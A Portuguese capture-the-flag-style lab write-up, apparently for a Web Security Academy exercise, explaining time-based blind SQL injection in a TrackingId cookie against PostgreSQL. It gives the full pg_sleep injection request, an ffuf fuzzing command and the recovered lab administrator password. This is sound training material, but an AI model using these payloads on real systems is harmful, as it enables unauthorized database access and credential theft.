## Objetivo
Descobrir a senha do usuário ``administrator`` através de SQL injection no cookie ``TrackingId`` observando diferença no tempo de resposta do servidor

## Vulnerabilidade Identificada
O parâmetro ``TrackingId`` é concatenado diretamente na query SQL sem sanitização, permitindo injeção que cause erro visível de resposta de tempo de servidor 



## Metodologia
Primeiro identifiquei o DB fazendo um teste de tempo de resposta
<img width="1920" height="928" alt="Screenshot From 2026-05-02 09-43-33" src="https://github.com/user-attachments/assets/e77d673c-bb2e-450d-98ad-1d13355d97fd" />
<br>
<br>
Após identificar como PostgreSQL fiz o teste para ver se minha condição de verdadeiro estava funcionando corretamente
<img width="1843" height="941" alt="Screenshot From 2026-05-02 09-56-53" src="https://github.com/user-attachments/assets/62962e3b-7811-4f21-a7b0-399dd0bf5ae0" />
<br>
<br>
com uma diferença clara de tempo de resposta criei uma wordlist de a-z, 0-9 & A-Z; chamada de testefuz.txt 
depois criei uma req.txt para alocar o header do cookie com o SQLi e após isso rodei a ffuf attack-line com ``-ft '<4000'`` para filtrar TRUE fiz posição por posição até posição 21 retornar falso.



## Comandos Utilizados

req.txt
```bash
GET / HTTP/1.1
Host: 0a7000f30398f6a58143fc3700470032.web-security-academy.net
Cookie: TrackingId='||(SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'FUZZ') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username= 'administrator')--; session=jhI1lu3OowndtqAj3qNuSFu1FHOG0Bj1
```

ffuf attack-line
```bash
ffuf -w /home/luweed/Documents/testefuz.txt:FUZZ \
     -request /home/luweed/Documents/req.txt \
     -request-proto https \
     -ft '<4000'
```

ultima req.txt (retornou falso)
```bash
GET / HTTP/1.1
Host: 0a7000f30398f6a58143fc3700470032.web-security-academy.net
Cookie: TrackingId='||(SELECT CASE WHEN (SUBSTRING(password, 21, 1) = 'FUZZ') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username= 'administrator')--; session=jhI1lu3OowndtqAj3qNuSFu1FHOG0Bj1
```


## Resultado
user: administrator   password:mq5pebbstt3itc8j82aa

## Lições Aprendidas
Aprendi a enumerar dados via blind SQLi usando tempo de resposta do servidor como canal de inferência, quando o banco executa a query de forma síncrona.

